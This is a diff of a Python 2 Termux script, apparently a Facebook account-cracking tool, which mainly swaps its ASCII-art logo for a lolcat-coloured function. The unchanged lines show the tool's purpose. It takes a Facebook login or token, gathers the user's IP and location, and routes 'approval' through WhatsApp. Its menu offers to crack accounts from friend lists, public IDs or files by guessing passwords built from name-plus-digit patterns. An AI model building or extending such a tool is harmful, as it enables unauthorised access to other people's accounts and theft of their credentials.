@@ -26,7 +26,8 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 jam.py')
+    os.system("pip2 install lolcat")
+    os.system('python2 shahrukh.py')
     __author__ = 'Mr.James'
     __copyright = 'All rights reserved . Copyright  Mr.James'
 os.system('termux-setup-storage')
@@ -79,22 +80,8 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.1)
 ##### INTRO #####
-logo ="""
-\x1b[1;96m░░░░░██╗░█████╗░███╗░░░███╗
-\x1b[1;96m░░░░░██║██╔══██╗████╗░████║
-\x1b[1;96m░░░░░██║███████║██╔████╔██║
-\x1b[1;96m██╗░░██║██╔══██║██║╚██╔╝██║
-\x1b[1;96m╚█████╔╝██║░░██║██║░╚═╝░██║
-\x1b[1;96m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
-\x1b[1;97m--------------------------------------------------------------
-\x1b[1;94m➣  YouTube  : JAM SHAHRUKH TECHNICAL
-\x1b[1;94m➣  Facebook : JAM SHAHRUKH
-\x1b[1;94m➣  Note     : Dont ReEdit It 
-\x1b[1;94m➣  Github   : https://github.com/Jam302/King
-\x1b[1;94m➣  Whatsapp : +971528752764
-\x1b[1;94m➣  Note     : Having Problem? Contact Me On Whatsapp.
-\x1b[1;94m➣  Disclamiar : This Is For Educational Purpose Only.
-\x1b[1;97m--------------------------------------------------------------"""
+def logo():
+    os.system('echo -e "\n\n\033[1;92m    .S    .S_SSSs   SSS.        .SSS\n\033[1;92m   .SS  .SS~SSSSS   sSSS        SSSs\n\033[1;91m   S%S  S%S   SSSS  S%SSS      SSS%S\n\033[1;91m   S%S  S%S    S%S  S%S  SS  SS  S%S\n\033[1;97m   S&S  S%S•SSSS%S  S%S   s..s   S%S\n\033[1;97m   S&S  S&S  SSS%S  S&S    ss    S&S\n\033[1;94m   S&S  S&S    S&S  S&S          S&S\n\033[1;94m   S&S  S&S    S&S  S&S          S&S\n\033[1;93m   d*S  S*S    S&S  S*S          S*S\n\033[1;93m  .S*S  S*S    S*S  S*S          S*S\n\033[1;96msdSSS   S*S    S*S  S*S          S*S\n\033[1;96mYSSY    SSS    S*S  SSS          S*S\n\033[1;91m-----------------------------------------------\n\033[1;97m➣ Author : Jam Shahrukh x Xtylo Ali Raza\n\033[1;97m➣ Github : https://github.com/Stylish-Queen\n\033[1;97m➣ Fb Page: Jam Shahrukh Official\n\033[1;91m-----------------------------------------------" | lolcat')
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -103,7 +90,7 @@ def tik():
 
 def reg():
     os.system('clear')
-    print logo
+    logo()
     print ''
     print '\033[1;31;1mTake The Free Approval For Login'
     print ''
@@ -124,16 +111,11 @@ def reg():
         ip()
     else:
         os.system('clear')
-        print logo
-        print ''
+        logo()
         print '\tApproved Failed'
-        print ''
         print ' \033[1;92mYour Id Is Not Approved Already '
-        print ''
         print ' \033[1;92mCopy token id and send to Jam Shahrukh'
-        print ''
         print ' \033[1;92mYour id: ' + to
-        print ''
         raw_input('\033[1;93m Press enter to send id')
         os.system('xdg-open https://wa.me/+923053176060')
         reg()
@@ -141,15 +123,11 @@ def reg():
 
 def reg2():
     os.system('clear')
-    print logo
-    print ''
+    logo()
     print '\tApproval not detected'
-    print ''
     print ' \033[1;92mCopy and press enter , And Send Me On +923053176060'
-    print ''
     id = uuid.uuid4().hex[:50]
     print ' Your id: ' + id
-    print ''
     print ''
     raw_input(' Press enter to go to whatsapp ')
     os.system('xdg-open https://wa.me/+923053176060')
@@ -162,10 +140,8 @@ def reg2():
 
 def ip():
     os.system('clear')
-    print logo
-    print ''
+    logo()
     print '\tCollecting device info'
-    print ''
     
     try:
         ipinfo = requests.get('http://ip-api.com/json/')
@@ -177,18 +153,14 @@ def ip():
     except:
         pass
 
-    print '\033[1;93m Your ip: ' + ips
-    time.sleep(2)
-    print ''
-    print '\033[1;93m Your country: ' + country
-    time.sleep(2)
-    print ''
+    print '\033[1;92m Your ip: ' + ips
+    time.sleep(1)
+    print '\033[1;92m Your country: ' + country
+    time.sleep(1)
     print '\033[1;92m Your region: ' + regi
-    time.sleep(2)
-    print ''
+    time.sleep(1)
     print ' \033[1;92mYour network: ' + network
     time.sleep(1)
-    print ''
     print ' Loading ...'
     time.sleep(1)
     methodlogin()
@@ -198,7 +170,7 @@ def methodlogin():
                  t_check = open('access_token.txt', 'r')
 	except (KeyError, IOError):
 	         os.system('clear')
-	         print logo
+	         logo()
 	         print "[1] Login With ID/Password."
 	         print "[2] Login Using Token."
 	         print "[3] Exit."
@@ -211,7 +183,7 @@ def methodlogin():
 		login()
 	elif hos =="2":
 		os.system('clear')
-		print logo
+		logo()
 		hosp = raw_input("[+] Give Token : ")
 		tik()
 		hopa = open('login.txt', 'w')
@@ -234,7 +206,7 @@ def login():
 		menu() 
 	except (KeyError,IOError):
 		os.system('clear')
-		print logo
+		logo()
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
@@ -314,7 +286,7 @@ def menu():
 		print"\x1b[1;97mThere is no internet connection"
 		keluar()
 	os.system("clear") #Dev:jam
-	print logo
+	logo()
 	print "  \033[1;97m        ⚡ \033[1;97mLogged in User Info\033[1;97m ⚡"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
@@ -356,7 +328,7 @@ def super():
 		time.sleep(1)
 		methodlogin()
 	os.system('clear')
-	print logo
+	logo()
 	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
 	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
 	print "\033[1;97m✧ \033[1;97m3.\x1b[1;97mCrack From File."
@@ -373,7 +345,7 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print logo
+		logo()
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                 p3 = raw_input(' \033[1;92m[3]Name + digit: ')
@@ -389,7 +361,7 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print logo
+		logo()
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                 p3 = raw_input(' \033[1;92m[3]Name + digit: ')
@@ -404,7 +376,7 @@ def pilih_super():
                         q = json.loads(r.text)
                         z = q['name']
 			os.system('clear')
-                        print logo
+                        logo()
 			print ' \033[1;92mCloning from: ' + z
 		except KeyError:
 			print"\x1b[1;97mID Not Found!"
@@ -420,7 +392,7 @@ def pilih_super():
                     id.append(uid + '|' + nm)
         elif peak =="3":
 		os.system('clear')
-	        print logo
+	        logo()
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                 p3 = raw_input(' \033[1;92m[3]Name + digit: ')
